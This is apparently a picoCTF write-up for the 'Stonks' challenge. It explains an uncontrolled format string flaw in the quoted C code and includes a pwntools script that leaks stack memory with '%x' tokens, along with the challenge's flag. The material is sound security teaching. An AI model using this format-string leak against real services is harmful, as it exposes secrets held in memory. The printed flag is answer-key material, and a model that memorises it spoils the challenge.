# Stonks
> Binary Exploitation

### Description
> I decided to try something no one else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure!
>
> [vuln.c](https://mercury.picoctf.net/static/fdf270d959fa5231e180e2bd11421d0c/vuln.c)
>
> nc mercury.picoctf.net 16439
>
> **Hint 1: Okay, maybe I'd believe you if you find my API key.**

### Solution
It seems we're given a vulnerable C program and a domain/port to netcat to. It's a safe bet to think that `vuln.c` is the program we'll be interacting with over netcat. Furthermore, it's probably the case that the program is reading a flag stored somewhere on the server, and our job is to find out where the program is vulnerable, exploit that, and retrieve the flag off it.

Opening up `vuln.c` and taking a look at what's inside, there are 2 things that jump out as interesting.

One is that in the function buy\_stonks(Portfolio \*p), we see the following:
```
char api_buf[FLAG_BUFFER];
FILE *f = fopen("api", "r");
if (!f) {
    printf("Flag file not found. Contact an admin.\n");
    exit(1);
}
fgets(api_buf, FLAG_BUFFER, f);
```
Which indicates that the flag is being read into a buffer stored in the program.

The other thing to jump out as interesting is this:
```
// TODO: Figure out how to read token from file, for now just ask

char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);

// TODO: Actually use key to interact with API

view_portfolio(p);
```
Which indicates the program is taking in user input and placing that into a buffer right after the API (flag) is stored. If we can somehow overflow the buffer the user input is stored in, we might be able to access the flag stored in the previous buffer (a.k.a buffer overrun since we're reading - not writing - past the end of the array).

Looking at this code block, these 3 lines are particularly important:
```
char *user_buf = malloc(300 + 1);
scanf("%300s", user_buf);
printf(user_buf);
```
Here, we can see that the input buffer is being printed out, with no accompanying sanitation. Furthermore, there's no format specifier for what's passed into the function call. This looks like it might be vulnerable to an [uncontrolled format string](https://en.wikipedia.org/wiki/Uncontrolled_format_string) (or format string exploit) attack. If we use some %x format tokens as our input, we can print out some stack addresses in hex format.

The reason this works is pretty clearly explained in [this](https://www.youtube.com/watch?v=0WvrSfcdq1I) LiveOverflow video. Essentially, printf is reading whatever was placed onto the stack. Normally, these are the parameters you've placed onto the stack when you call printf, but in this case since we're going to be using the %x format token and there are no passed in parameters, printf is will read values off the stack. It shouldn't do this, but it does. There are more arguments being called than were provided, so it will pull from the stack. If we can throw in enough %x's (to print stack data in hex format) in there, we should be able to print the flag value that's stored on the stack.

So, we can use python to connect to the socket and write out these format specifiers:
```
import socket
from pwn import * # NOQA

r = remote("mercury.picoctf.net", 16439) # NOQA
r.recvuntil(b"View my portfolio\n")

r.send(b"1\n")
r.recvuntil(b"What is your API token?\n")

# Using format string attack here
r.send("%x" + "-%x"*40 + "\n")
r.recvline()

# Now we want to capture the "printf" output of user_buf
buf = r.recvline()
buf = buf[:-1].decode()
print(buf)

s = ""
for i in buf.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

print(s)
```
Which results in our flag! Note that this is an inherent vulnerability within printf and to avoid such attacks, always call the function with format specifiers or sanitize user input.

### Flag
`picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}`

### Helpful Resources
- https://stackoverflow.com/questions/31206885/why-is-printf-printing-out-in-this-code
